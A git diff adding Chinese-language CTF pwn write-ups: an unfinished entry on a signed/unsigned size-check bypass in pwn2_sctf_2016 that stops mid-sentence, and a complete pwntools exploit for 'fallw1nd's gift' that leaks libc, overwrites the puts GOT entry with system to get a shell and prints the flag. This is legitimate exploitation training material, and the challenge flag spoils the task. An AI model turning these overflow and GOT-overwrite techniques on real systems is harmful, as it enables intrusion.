@@ -2410,6 +2410,86 @@ io.interactive()
 
 ------
 
+### pwn2_sctf_2016
+
+先`file ./pwn2_sctf_2016`查看文件类型，再`checksec --file=./pwn2_sctf_2016`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ file ./pwn2_sctf_2016
+./pwn2_sctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4b6d53bc9aca0e73953173f153dc75bd540d6a48, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ checksec --file=./pwn2_sctf_2016
+[*] '/home/tyd/ctf/pwn/buuctf/pwn2_sctf_2016'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+`NX enabled`开启栈中不可执行，可能是`ret2shellcode`或`ret2libc`。用`IDA Pro 32bit`打开附件`./pwn2_sctf_2016`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  setvbuf(stdout, 0, 2, 0);
+  return vuln();
+}
+```
+
+双击`vuln()`函数查看详情：
+
+```c
+int vuln()
+{
+  char nptr[32]; // [esp+1Ch] [ebp-2Ch] BYREF
+  int v2; // [esp+3Ch] [ebp-Ch]
+
+  printf("How many bytes do you want me to read? ");
+  get_n(nptr, 4);
+  v2 = atoi(nptr);
+  if ( v2 > 32 )
+    return printf("No! That size (%d) is too large!\n", v2);
+  printf("Ok, sounds good. Give me %u bytes of data!\n", v2);
+  get_n(nptr, v2);
+  return printf("You said: %s\n", nptr);
+}
+```
+
+当`get_n()`获取的`nptr`大于`32`时会退出程序，双击`get_n()`函数查看详情：
+
+```c
+int __cdecl get_n(int a1, unsigned int a2)
+{
+  unsigned int v2; // eax
+  int result; // eax
+  char v4; // [esp+Bh] [ebp-Dh]
+  unsigned int i; // [esp+Ch] [ebp-Ch]
+
+  for ( i = 0; ; ++i )
+  {
+    v4 = getchar();
+    if ( !v4 || v4 == 10 || i >= a2 )
+      break;
+    v2 = i;
+    *(_BYTE *)(v2 + a1) = v4;
+  }
+  result = a1 + i;
+  *(_BYTE *)(a1 + i) = 0;
+  return result;
+}
+```
+
+在`32`位有符号整型`int`中，`-1`在计算机中的值为**11111111 11111111 11111111 11111111 = 0xFFFFFFFF**，而这个数值在`32`位无符号整型`unsigned int`中的十进制值为**4294967295**，因此我们可以用`-1`来绕过`if ( v2 > 32 )`这个判断条件，并且构造了栈溢出漏洞。没有任何重新审计`vuln()`函数，我们可以
+
+https://zhuanlan.zhihu.com/p/369422838
+
+https://blog.csdn.net/m0sway/article/details/123986308
+
+https://blog.csdn.net/m0_52231248/article/details/121361432
+
 ### ret2text
 
 先`file ./pwn`查看文件类型，再`checksec --file=./pwn`检查文件保护情况。
@@ -2796,6 +2876,72 @@ shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x
 io.sendlineafter(b'Hello my friend.Any gift for me?\n', shellcode)
 payload = b'a'*(0x30+0x8) + p64(0x233000)
 io.sendlineafter(b'Anything else?\n', payload)
+io.interactive()
+```
+
+------
+
+### fallw1nd’s gift
+
+先`file ./fallw1nd_gift `查看文件类型，再`checksec --file=./fallw1nd_gift `检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/fallw1nd’s gift]
+└─$ file ./fallw1nd_gift 
+./fallw1nd_gift: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d1fe46636250f6e722c2df9769c4a30b3da9d2f7, for GNU/Linux 3.2.0, not stripped
+
+┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/fallw1nd’s gift]
+└─$ checksec --file=./fallw1nd_gift 
+[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/fallw1nd’s gift/fallw1nd_gift'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  void *buf[2]; // [rsp+0h] [rbp-10h] BYREF
+
+  buf[1] = (void *)__readfsqword(0x28u);
+  init(argc, argv, envp);
+  puts("fallw1nd says you are the best pwnner,he will give you a gift as reward:");
+  printf("%p", &puts);
+  puts("\nnow input your addr:");
+  __isoc99_scanf("%p", buf);
+  puts("now input your content:");
+  read(0, buf[0], 0x10uLL);
+  puts("/bin/sh");
+  exit(0);
+}
+```
+
+程序直接用`printf`把`puts`函数的真实地址输出了，可以用这个地址来泄露`libc`基地址计算`system`函数的地址，`scanf("%p", buf);`这行代码可以到达任意一个地址，`read(0, buf[0], 0x10uLL);`能直接覆盖地址的内容。注意到程序中有行代码`puts("/bin/sh");`，我们可以考虑将`puts`的`got`表中存放的内容修改为`system`的地址，这样程序在执行`puts("/bin/sh");`时调用`puts_got`就会跳转到`system`的地址执行`system("/bin/sh")`，从而获得靶机的`shell`权限。`scanf("%p", buf)`只接收十六进制数，所以我们先把`puts`的`got`表所在地址赋值给`buf`，然后利用`read()`函数将`buf`中的内容修改为`system()`函数的地址，最后程序执行`system("/bin/sh")`。这题的一个坑就是`LibcSearcher`找到的`libc`版本都不对，用[**ret2libc**](#ret2libc)这题给出的`libc`能打通。编写`Python`代码求解，拿到靶机的`shell`权限后`cat flag`，提交`flag{ae50f983-a8e2-49fe-b4b3-b1f44033241e}`即可。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 29776)
+elf = ELF('./fallw1nd_gift')
+io.recvuntil(b'fallw1nd says you are the best pwnner,he will give you a gift as reward:\n')
+puts_addr = int(io.recvline()[:-1], 16)
+log.info('puts_address => %#x' % puts_addr)
+io.recvuntil(b'now input your addr:\n')
+puts_got = elf.got['puts']
+io.sendline(hex(puts_got))
+libc = ELF('./libc-2.31.so')
+libcbase = puts_addr - libc.symbols['puts']
+log.success('libcbase_address => %s', hex(libcbase))
+system_addr = libcbase + libc.symbols['system']
+log.success('system_address => %s', hex(system_addr))
+bin_sh_addr = 0x402082
+payload = p64(system_addr)
+io.sendlineafter(b'now input your content:', payload)
 io.interactive()
 ```
 
